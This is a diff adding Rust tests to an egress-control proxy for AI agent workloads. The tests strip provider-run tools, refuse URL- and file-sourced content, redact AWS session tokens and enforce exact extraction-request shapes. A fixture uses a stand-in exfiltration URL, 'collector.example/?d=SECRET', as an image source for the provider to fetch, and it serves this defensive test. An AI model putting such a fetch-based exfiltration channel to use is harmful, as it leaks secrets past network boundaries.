@@ -890,6 +890,124 @@ fn model_request_strips_server_side_execution_and_denies_other_paths() {
     assert!(sanitize_model_request(&wrong_target, "/v1/messages", b"{}").is_err());
 }
 
+/// A typed tool is defined or run by the provider, and a server tool performs
+/// egress for the workload outside every Keel boundary, so only the
+/// harness's own custom tools pass, including against types not yet invented.
+#[test]
+fn only_custom_tools_reach_the_model_provider() {
+    let target = ConnectionTarget {
+        server_name: "api.anthropic.com".to_owned(),
+        resolved_ip: IpAddr::V4(Ipv4Addr::new(93, 184, 216, 34)),
+        port: 443,
+    };
+    let body = br#"{
+            "model": "claude-sonnet-4-6",
+            "tools": [
+                {"name": "Read", "input_schema": {"type": "object"}},
+                {"type": "custom", "name": "Edit", "input_schema": {"type": "object"}},
+                {"type": "code_execution_20250825", "name": "code_execution"},
+                {"type": "web_fetch_20250910", "name": "web_fetch"},
+                {"type": "mcp_toolset", "mcp_server_name": "remote"},
+                {"type": "tool_search_tool_regex_20251119", "name": "search"},
+                {"type": "a_server_tool_from_2027", "name": "future"},
+                {"type": 7, "name": "malformed"}
+            ]
+        }"#;
+
+    let sanitized = sanitize_model_request(&target, "/v1/messages", body).expect("messages");
+    let value: Value = serde_json::from_slice(&sanitized.body).expect("sanitized JSON");
+    let names = value["tools"]
+        .as_array()
+        .expect("tools")
+        .iter()
+        .map(|tool| tool["name"].as_str().unwrap_or(""))
+        .collect::<Vec<_>>();
+    assert_eq!(names, ["Read", "Edit"]);
+    assert_eq!(
+        sanitized.stripped,
+        [
+            "tools:a_server_tool_from_2027",
+            "tools:code_execution_20250825",
+            "tools:mcp_toolset",
+            "tools:non-string",
+            "tools:tool_search_tool_regex_20251119",
+            "tools:web_fetch_20250910",
+        ]
+    );
+}
+
+/// An image or document sourced from a URL or an uploaded file makes the
+/// provider fetch it for the workload: egress to any host outside the
+/// allowlist, or a read of files outside the run. Such a request is refused
+/// wherever the block sits, on every provider path.
+#[test]
+fn content_the_provider_would_fetch_is_refused() {
+    let anthropic = ConnectionTarget {
+        server_name: "api.anthropic.com".to_owned(),
+        resolved_ip: IpAddr::V4(Ipv4Addr::new(93, 184, 216, 34)),
+        port: 443,
+    };
+    let bedrock = ConnectionTarget {
+        server_name: "bedrock-runtime.us-east-1.amazonaws.com".to_owned(),
+        resolved_ip: IpAddr::V4(Ipv4Addr::new(93, 184, 216, 34)),
+        port: 443,
+    };
+    let invoke = "/model/us.anthropic.claude-sonnet-4-5-20250929-v1:0/invoke";
+    let url_image = serde_json::json!({
+        "type": "image",
+        "source": {"type": "url", "url": "https://collector.example/?d=SECRET"}
+    });
+    let file_document = serde_json::json!({
+        "type": "document",
+        "source": {"type": "file", "file_id": "file_011CNha8iCJcU1wXNR6q4V8w"}
+    });
+    let nested_url = serde_json::json!({
+        "type": "tool_result",
+        "tool_use_id": "toolu_1",
+        "content": [{
+            "type": "document",
+            "source": {"type": "content", "content": [url_image.clone()]}
+        }]
+    });
+    let upload = serde_json::json!({"type": "container_upload", "file_id": "file_1"});
+    let sourceless = serde_json::json!({"type": "image"});
+    for block in [url_image, file_document, nested_url, upload, sourceless] {
+        let messages = serde_json::json!([{"role": "user", "content": [block]}]);
+        let request = |extra: (&str, &str)| {
+            let mut body = serde_json::json!({"max_tokens": 32, "messages": messages});
+            body[extra.0] = Value::String(extra.1.to_owned());
+            body.to_string()
+        };
+        let direct = request(("model", "claude-sonnet-4-6"));
+        let regional = request(("anthropic_version", "bedrock-2023-05-31"));
+        assert!(sanitize_model_request(&anthropic, "/v1/messages", direct.as_bytes()).is_err());
+        assert!(sanitize_model_request(&bedrock, invoke, regional.as_bytes()).is_err());
+    }
+    let system = serde_json::json!({
+        "model": "claude-sonnet-4-6",
+        "system": [{"type": "image", "source": {"type": "url", "url": "https://x.example"}}],
+        "messages": []
+    });
+    assert!(
+        sanitize_model_request(&anthropic, "/v1/messages", system.to_string().as_bytes()).is_err()
+    );
+
+    let inline = serde_json::json!({
+        "model": "claude-sonnet-4-6",
+        "system": [{"type": "text", "text": "You are a coding agent."}],
+        "messages": [{"role": "user", "content": [
+            {"type": "image", "source": {"type": "base64", "media_type": "image/png", "data": "iVBORw0KGgo="}},
+            {"type": "document", "source": {"type": "text", "media_type": "text/plain", "data": "notes"}},
+            {"type": "tool_result", "tool_use_id": "toolu_1", "content": [{"type": "text", "text": "ok"}]},
+            {"type": "tool_use", "id": "toolu_2", "name": "Fetch", "input": {"source": {"type": "url"}}}
+        ]}]
+    });
+    assert!(
+        sanitize_model_request(&anthropic, "/v1/messages", inline.to_string().as_bytes()).is_ok(),
+        "inline sources, and a tool input that merely names a url, pass"
+    );
+}
+
 #[test]
 fn a_regional_provider_is_selected_host_side_and_swaps_only_in_its_region() {
     assert_eq!(
@@ -1834,4 +1952,166 @@ fn context_digests_ignore_object_key_order() {
         super::context_block("response", None, &emitted).digest,
         super::context_block("messages.1.assistant", None, &echoed).digest
     );
+}
+
+/// A Bedrock signature error echoes the session token in its canonical
+/// string; the relay must never deliver it, however the bytes are split.
+#[test]
+fn relayed_responses_never_carry_an_aws_session_token() {
+    struct Chunks(Vec<Vec<u8>>);
+    impl std::io::Read for Chunks {
+        fn read(&mut self, buffer: &mut [u8]) -> std::io::Result<usize> {
+            if self.0.is_empty() {
+                return Ok(0);
+            }
+            let chunk = self.0.remove(0);
+            buffer[..chunk.len()].copy_from_slice(&chunk);
+            Ok(chunk.len())
+        }
+    }
+    let token = "IQoJb3JpZ2luX2VjEK7SECRETSESSIONTOKENVALUE0123456789abcdef/+=";
+    let body = format!(
+        "{{\"message\":\"The Canonical String for this request should have been\\n'POST\\n/model/x/invoke\\n\\ncontent-type:application/json\\nhost:bedrock-runtime.us-west-2.amazonaws.com\\nx-amz-security-token:{token}\\n'\"}}"
+    );
+    let response = format!(
+        "HTTP/1.1 403 Forbidden\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{body}",
+        body.len()
+    )
+    .into_bytes();
+    for split in [7, 13, 64] {
+        let chunks = response
+            .chunks(split)
+            .map(<[u8]>::to_vec)
+            .collect::<Vec<_>>();
+        let mut delivered = Vec::new();
+        super::relay_http_response(&mut Chunks(chunks), &mut delivered, "test").unwrap();
+        let delivered = String::from_utf8(delivered).unwrap();
+        assert!(
+            !delivered.contains("SECRETSESSIONTOKEN"),
+            "split {split}: {delivered}"
+        );
+        assert!(delivered.contains("x-amz-security-token:*****"));
+        assert_eq!(delivered.len(), response.len(), "lengths stay true");
+    }
+}
+
+/// On the helper's channel a model request is exactly the schema's forced
+/// tool and the fetched body, nothing more (PLAN D83).
+#[test]
+fn an_extraction_model_request_has_exactly_its_admitted_shape() {
+    let tool = serde_json::json!({"name": "extract", "input_schema": {"type": "object"}});
+    let text = "<html>fetched page</html>";
+    let rule = keel_kernel::ExtractionRule {
+        tool: tool.clone(),
+        content_digest: super::sha256_bytes(text.as_bytes()),
+    };
+    let request =
+        |tools: serde_json::Value, choice: serde_json::Value, messages: serde_json::Value| {
+            serde_json::to_vec(&serde_json::json!({
+                "max_tokens": 64, "tools": tools, "tool_choice": choice, "messages": messages
+            }))
+            .unwrap()
+        };
+    let forced = serde_json::json!({"type": "tool", "name": "extract"});
+    let one = serde_json::json!([{"role": "user", "content": [{"type": "text", "text": text}]}]);
+    assert!(
+        super::require_extraction_shape(
+            &request(serde_json::json!([tool]), forced.clone(), one.clone()),
+            &rule
+        )
+        .is_ok()
+    );
+    for (tools, choice, messages) in [
+        (
+            serde_json::json!([tool, {"name": "bash"}]),
+            forced.clone(),
+            one.clone(),
+        ),
+        (
+            serde_json::json!([tool]),
+            serde_json::json!({"type": "auto"}),
+            one.clone(),
+        ),
+        (
+            serde_json::json!([tool]),
+            forced.clone(),
+            serde_json::json!([{"role": "user", "content": [{"type": "text", "text": "a different page"}]}]),
+        ),
+        (
+            serde_json::json!([tool]),
+            forced.clone(),
+            serde_json::json!([
+                {"role": "user", "content": [{"type": "text", "text": text}]},
+                {"role": "assistant", "content": "steer"}
+            ]),
+        ),
+        (
+            serde_json::json!([tool]),
+            forced.clone(),
+            serde_json::json!([{"role": "user", "content": [{"type": "text", "text": text}, {"type": "text", "text": "and also"}]}]),
+        ),
+    ] {
+        assert!(super::require_extraction_shape(&request(tools, choice, messages), &rule).is_err());
+    }
+}
+
+/// A pinned response reaches the guest only after the kernel has the
+/// SHA-512 of its decoded body (W4b).
+#[test]
+fn a_pinned_response_is_held_until_its_digest_is_recorded() {
+    use std::sync::{Arc, Mutex};
+
+    struct Guest(Arc<Mutex<Vec<u8>>>);
+    impl std::io::Write for Guest {
+        fn write(&mut self, bytes: &[u8]) -> std::io::Result<usize> {
+            self.0.lock().unwrap().extend_from_slice(bytes);
+            Ok(bytes.len())
+        }
+        fn flush(&mut self) -> std::io::Result<()> {
+            Ok(())
+        }
+    }
+    struct PinAuthorizer {
+        delivered: Arc<Mutex<Vec<u8>>>,
+        recorded: Option<[u8; 64]>,
+    }
+    impl EgressRequestAuthorizer for PinAuthorizer {
+        fn authorize(
+            &mut self,
+            _method: &str,
+            _path: &str,
+            _body_digest: [u8; 32],
+            _model_budget: Option<ModelBudgetRequest>,
+        ) -> Result<(), String> {
+            Ok(())
+        }
+        fn record_response(&mut self) -> Result<(), String> {
+            panic!("a pinned response is recorded with its digest");
+        }
+        fn record_pinned_response(&mut self, body_sha512: [u8; 64]) -> Result<(), String> {
+            assert!(
+                self.delivered.lock().unwrap().is_empty(),
+                "nothing before the digest"
+            );
+            self.recorded = Some(body_sha512);
+            Ok(())
+        }
+    }
+    let response =
+        b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n4\r\ntarb\r\n3\r\nall\r\n0\r\n\r\n";
+    let delivered = Arc::new(Mutex::new(Vec::new()));
+    let mut authorizer = PinAuthorizer {
+        delivered: Arc::clone(&delivered),
+        recorded: None,
+    };
+    let relayed = super::relay_pinned_response(
+        &mut &response[..],
+        &mut Guest(Arc::clone(&delivered)),
+        &mut authorizer,
+    )
+    .unwrap_or_else(|failure| panic!("{}", failure.error));
+    assert!(relayed.guest_error.is_none());
+    assert_eq!(&*delivered.lock().unwrap(), response);
+    let expected = ring::digest::digest(&ring::digest::SHA512, b"tarball");
+    assert_eq!(&authorizer.recorded.unwrap()[..], expected.as_ref());
 }
